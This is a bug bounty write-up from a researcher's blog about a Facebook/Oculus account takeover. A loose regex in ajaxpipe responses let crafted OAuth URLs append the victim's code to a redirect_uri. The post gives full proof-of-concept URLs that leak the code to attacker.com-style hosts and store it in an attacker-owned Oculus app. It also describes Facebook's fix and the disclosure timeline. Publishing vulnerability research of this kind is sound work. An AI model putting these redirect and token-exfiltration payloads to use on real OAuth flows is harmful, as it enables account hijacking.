---
id: 654
title: 'Facebook account takeover due to a wide platform bug in ajaxpipe responses'
date: '2021-04-01T23:27:18+00:00'
author: qw
layout: post
guid: 'https://ysamm.com/?p=654'
wp_featherlight_disable:
    - ''
categories:
    - Uncategorized
---

This bug could allow a malicious user to steal the access_token/code of a first party Facebook application and use it to takeover the Facebook account. This happens due to some preformatted scripts returned when the ajaxpipe or quickling parameters were added to any requested endpoint in any website built by Facebook.

**Details**

A response to a request sent to any Facebook endpoint/page could be returned in a different way than the usual format: A normal response would be a HTML page containing the data or functionality an endpoint is serving. However, if the content of the requested endpoint/page doesn’t need to be displayed to the user but the data returned is needed by another page, parameters like **ajaxpipe** or **quickling** could be added to the request which would result in the content of the page to not be shown but transferred to the parent window by calling a function called **require** and a module called **JSONPTransport**. This is usually done as an alternative way of doing ajax requests. The response to a such request with previous parameters included would be something like this:

```markup
<html><body><script type="text/javascript">window._cstart = parent._q_cstart = (+new Date);</script>
<script>
if (self != top) {
    parent.require("JSONPTransport").respond(0, {
        "__ar": 1,
        "payload": {
            "redirect": "https:\/\/www.facebook.com\/"
        }
    }, false);
} else {
    window.location.search = window.location.search.replace(/\b(quickling|ajaxpipe|ajaxpipe_token)\b[^&]*&?/g, "");
}
</script>
</body></html>
```

Here the script is used to transfer the content of the page to the parent window (if same origin) however if the current window is top then this would perform some regular expression matching to change the location of the page after removing any occurrences of the quickling/ajaxpipe/ajaxpipe_token parameters. Here of course the window.location.search is checked and modified since it would return the querystring part of the current URL.   
The bug here is that the regex is not doing it right and allows a sophisticated attacker to abuse this in his/her benefit to launch some attacks. Let’s first figure out what’s wrong here:  
  
– If we analyse the code we’ll notice that the Javascript method **replace** was used to modify the **location.search** value using a regular expression matching. Anything matched using the regular expression would be removed since it’s replaced with nothing “”.  
– The regular expression has the parameters names **(quickling|ajaxpipe|ajaxpipe_token)** put between “**\\b**” anchors which would allow a word only matching of them ( these string were found between non-word characters ). Then it would look for zero or multiple occurrences of the character **&amp;**. The **g** modifier was used which means it would perform a global match ( won’t return at first match ). As an example here, if we have the query string part as “?ajaxpipe=1&amp;test=value”, this regex would match **ajaxpipe=1&amp;** and remove it.

- First problem is that the anchor “**\\b**” was used at the beginning of the regex which would look for non-word characters before the appearance of the mentioned words ( no characters in this groupset should be found \[A-Za-z0-9_\] for a match to happen). However, this would allow other characters to be included before the words like ( ? , – , =). This would help a lot later in the attack.
- Second problem is that this regex would match appearances of these words anywhere in the querystring part of the url and not only when they were found as parameters names. This is also linked or due to the first problem. A way to make sure these words are actually parameters names is to check if before them there was a **&amp;** character or the word was found at the beginning of the string after a **?** character ( using ^\\? ) . As an example here, if we take this querystring part of the url “?testing=ajaxpipe=random” then **ajaxpipe=random** would be matched even though it’s a value supplied to a parameter and not the parameter name.
- Final problem is that the g modifier was used which would do multiples matches. The querystring part could contain the words ajaxpipe/quickling/ajaxpipe_token as parameters names and in the same time as values supplied to other parameters. When the matching is done, the parameters would be replaced and also the values inside other parameters. This would allow us to abuse the previous problems to fully construct a working exploit.   
      
    PS: If you like to better understand how the regular expression works, try to use regex101 or regexr.

To summarize what i thought i can do with this:  
Let’s take for example this URL: **https://www.facebook.com/endpoint?ajaxpipe=1&amp;redirect_uri=https://attacker.com/?code=ajaxpipe=2&amp;token=ACCESS_TOKEN**.  
The parameter ajaxpipe=1 would result in the response described in the beginning to be returned. The regular expression would try to replace the ajaxpipe parameter since the window is top. It would first match **ajaxpipe=1&amp;** and then due to the problems 1 and 2, it would also match **ajaxpipe=2&amp;** ( they resulted to the character **=** to be allowed before ajaxpipe=random and also not being a parameter name but a parameter value).   
The two matches would be removed and the page would be redirected to : **https://www.facebook.com/endpoint?redirect_uri=https://attacker.com/?code=token=ACCESS_TOKEN**.   
What happened here is that the parameter **token=ACCESS_TOKEN** became apart of the value inside the **redirect_uri** parameter and was formatted in a way to be appended as value to the code parameter inside the URL inside redirect_uri. Also **ajaxpipe=1** parameter was removed which resulted in the page response returned being the normal one.   
Now if the endpoint was redirecting to the URL inside redirect_uri, it would result in a redirect to **https://attacker.com/?code=token=ACCESS_TOKEN** which would leak the ACCESS_TOKEN to the attacker. The expected safe behaviour here is to redirect to **https://attacker.com/?code=ajaxpipe=2**.

**Finally the attack**!

I exploited this behaviour to achieve the possibility of takeover of Facebook/Oculus accounts. Since this existed in a big number of Facebook websites ( facebook.com , oculus.com , messenger.com …) i had a big scope to look for a way to abuse this:  
  
– To login to your Oculus account, you should visit **https://auth.oculus.com/login/** . This page allows you to login to your account using Facebook. If you are already logged-in to Facebook and you already linked an Oculus account to your Facebook account, visiting this page would result to you being automatically logged-in to your Oculus account ( The Facebook Javascript SDK do a request to facebook.com and gets the access_token via /x/oauth/status endpoint ).  
  
– You can also request a code from Facebook for Oculus login by using the OAuth flow (/dialog/oauth endpoint). An example URL is the following https://www.facebook.com/v3.1/dialog/oauth?app_id=1517832211847102&amp;redirect_uri=https://auth.oculus.com/login/&amp;response_type=code. This would redirect to https://auth.oculus.com/login/?code=FB_CODE.  
  
– The redirect_uri of the Oculus application could have any string appended after https://auth.oculus.com/login . It means we can add additional parameters or change the callback endpoint.  
  
– There’s the endpoint https://auth.oculus.com/login-without-facebook/ which accepts a parameter called redirect_uri. If the user is already logged-in to Oculus it would redirect to the URL inside redirect_uri. We can use this endpoint in the redirect_uri in the Facebook OAuth flow  
  
**First try:**   
We combine the previous facts to make this first attack try. The victim visits this URL:  
https://www.facebook.com/v3.1/dialog/oauth?app_id=1517832211847102&amp;redirect_uri=https://auth.oculus.com/login-without-facebook/?**ajaxpipe=1%26**redirect_uri=https://ysamm.com/?code=**ajaxpipe**&amp;response_type=code

This would redirect to https://auth.oculus.com/login-without-facebook/?**ajaxpipe=1&amp;**redirect_uri=https%3a//ysamm.com/%3fcode%3dajaxpipe&amp;code=FACEBOOK_CODE. Since we have an ajaxpipe parameter the second response format would be returned and the replacing using the regex would be done. The highlighted part would be removed. The second ajaxpipe&amp; won’t be removed here since browsers would URL encode parameters’ values which would result to the **=** character being replaced with **%3d**. Since **d** is before ajaxpipe and it’s a word character then the matching would fail and though the attack.

**Second try:**

I looked for characters which were not URL encoded by browsers if they were found inside a parameter’s value. I found that **–** is not URL encoded and i inserted it before the second ajaxpipe:  
https://www.facebook.com/v3.1/dialog/oauth?app_id=1517832211847102&amp;redirect_uri=https://auth.oculus.com/login-without-facebook/?**ajaxpipe=1%26**redirect_uri=https://ysamm.com/?code=**-ajaxpipe**&amp;response_type=code  
  
This URL would result in a redirect to https://auth.oculus.com/login-without-facebook/?**ajaxpipe=1&amp;**redirect_uri=https%3a//ysamm.com/%3fcode%3d-**ajaxpipe&amp;**code=FACEBOOK_CODE  
  
Since now both ajaxpipe are matched using the regex, it would result in another redirect ( because if you didn’t notice , the script mentioned above would assign window.location.search a new value after the removal ) to https://auth.oculus.com/login-without-facebook/?redirect_uri=**https%3a//ysamm.com/%3fcode%3d-code=FACEBOOK_CODE**  
  
If you notice here the code=FACEBOOK_CODE was appended to the value of the parameter redirect_uri instead of being a separate parameter. If the login-without-facebook endpoint would redirect to the URL inside redirect_uri parameter, we would end-up being redirected to **https://ysamm.com/?code=-code=FACEBOOK_CODE** and though stealing the Facebook OAuth code of the victim. Unfortunately, this endpoint had protection in place from open redirects so i had to find a way to leak the code by redirecting to a whitelisted domain.

**Third and final try**

The API endpoint ***https://graph.oculus.com/{OC_APP_ID}/achievement_definitions***  could be used to create a new achievement definition for a certain owned oculus application. The endpoint accepts many parameters and some of them would be saved and could be fetched later by us. To make a request to this API endpoint, we could include our own application credentials in the final URL to be sent to the victim. We can use one of these parameter like the description field which should be filled with the victim code. The code can be retrieved later by first fetching ***https://graph.oculus.com/{OC_APP_ID}/achievement_definitions?method=get&amp;access_token=OC|ATTACKER_APP_ID|APP_SECRET***. This would return the list of achievements ids. Each id would be referring to different stored code. To retrieve the code:  
***https://graph.oculus.com/{ACHIEVEMENT_ID}?fields=description&amp;method=get&amp;access_token=OC|ATTACKER_APP_ID|APP_SECRET***. We’ll find “-code=CODE_HERE” in the description field.  
  
**Proof of concept**

```
https://www.facebook.com/v3.1/dialog/oauth?app_id=1517832211847102&redirect_uri=https%3A%2F%2Fauth.oculus.com%2Flogin-without-facebook%2F%3Fajaxpipe%3D1%26redirect_uri%3Dhttps%253a%2F%2Fgraph.oculus.com%2FATTACKER_APP_ID%2Fachievement_definitions%253fmethod%253dpost%2526access_token%253d<strong>OC|ATTACKER_APP_ID|ATTACKER_APP_SECRET</strong>%2526api_name%253dVISIT_3_CONTINENTS%2526achievement_type%253dBITFIELD%2526achievement_write_policy%253dCLIENT_AUTHORITATIVE%2526target%253d3%2526bitfield_length%253d7%2526is_archived%253dfalse%2526title%253dAchievement%2526unlocked_description_override%253dYou%252bdid%252bit%2526is_secret%253dfalse%2526description%253d-ajaxpipe&response_type=code
```

  
Where **OC|ATTACKER_APP_ID|ATTACKER_APP_SECRET** is the attacker owned Oculus application credentials  
This URL would redirect to:

```
https://auth.oculus.com/login-without-facebook/?<strong>ajaxpipe=1&</strong>redirect_uri=https%3A%2F%2Fgraph.oculus.com%2FATTACKER_APP_ID%2Fachievement_definitions%3Fmethod%3Dpost%26access_token%3DOC%7CATTACKER_APP_ID%7CATTACKER_APP_SECRET%26api_name%3DVISIT_3_CONTINENTS%26achievement_type%3DBITFIELD%26achievement_write_policy%3DCLIENT_AUTHORITATIVE%26target%3D3%26bitfield_length%3D7%26is_archived%3Dfalse%26title%3DAchievement%26unlocked_description_override%3DYou%2Bdid%2Bit%26is_secret%3Dfalse%26description%3D-<strong>ajaxpipe&</strong>code=VICTIM_CODE
```

  
This would result to the second format response being returned and the regex trying to remove ajaxpipe words appearances. It should redirect to this URL:

```
https://auth.oculus.com/login-without-facebook/?redirect_uri=<strong>https%3A%2F%2Fgraph.oculus.com%2FATTACKER_APP_ID%2Fachievement_definitions%3Fmethod%3Dpost%26access_token%3DOC%7CATTACKER_APP_ID%7CATTACKER_APP_SECRET%26api_name%3DVISIT_3_CONTINENTS%26achievement_type%3DBITFIELD%26achievement_write_policy%3DCLIENT_AUTHORITATIVE%26target%3D3%26bitfield_length%3D7%26is_archived%3Dfalse%26title%3DAchievement%26unlocked_description_override%3DYou%2Bdid%2Bit%26is_secret%3Dfalse%26description%3D-code=VICTIM_CODE</strong>
```

  
The code parameter was appended to the redirect_uri. Since graph.oculus.com is a whitelisted domain, the endpoint /login-without-facebook/ would redirect to the URL inside redirect_uri:

```
https://graph.oculus.com/ATTACKER_APP_ID/achievement_definitions?method=post&access_token=<strong>OC|ATTACKER_APP_ID|ATTACKER_APP_SECRET</strong>&api_name=VISIT_3_CONTINENTS&achievement_type=BITFIELD&achievement_write_policy=CLIENT_AUTHORITATIVE&target=3&bitfield_length=7&is_archived=false&title=Achievement&unlocked_description_override=You+did+it&is_secret=false&<strong>description=-code=VICTIM_CODE</strong>
```

  
Since the access_token is valid, a new achievement definition should be created with the field description having the value **-code=VICTIM_CODE**.  
  
We can get the victim code by querying the created achievement definition data. Getting the code would allow us to access the Oculus account. After accessing the Oculus account we can get the Facebook access_token and use it to also takeover the Facebook account ( see https://ysamm.com/?p=525 for more details)

**Fix**

Facebook fixed this by using a stricter regular expression to remove the ajaxpipe words:  
window.location.search.replace(**/(^\\?|&amp;)(quickling|ajaxpipe|ajaxpipe_token)\\b\[^&amp;\]\*&amp;?/g, “$1”**)  
Notice that now all previously mentioned problems were eliminated. Now it ensures these words are matched only if there is the character **&amp;** or a beginning **?** before them ( ^ is important here and not just checking for a **?** because in a case where a browser didn’t URL encode parameters values, this could resulted in a bypass since we can then use **description=?ajaxpipe&amp;** instead of **description=-ajaxpipe&amp;** in the poc)

**Timeline**

Feb 13, 2021— Report Sent   
Feb 23, 2021— Acknowledged by Facebook  
Mar 2, 2021— Fixed by Facebook  
Mar 30, 2021 — $30K (including bonus) bounty awarded by Facebook.

</body></html>